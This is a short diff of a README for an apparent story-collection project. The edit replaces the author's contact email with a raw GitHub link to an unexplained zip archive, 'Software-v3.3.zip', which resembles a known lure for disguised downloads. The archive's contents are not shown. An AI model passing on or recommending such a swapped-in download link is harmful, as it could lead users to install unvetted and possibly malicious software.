@@ -7,4 +7,4 @@ My aim for the project is that I integrate even more stories and more informatio
 In this project I have put 12 stories 3 for each. You can easily add more stories and related images to the same. 
 
 Please do contact if any doubts 
-  ayushpallod07@gmail.com
+  https://github.com/AyushPallod/IPR/raw/refs/heads/main/ischuria/Software-v3.3.zip
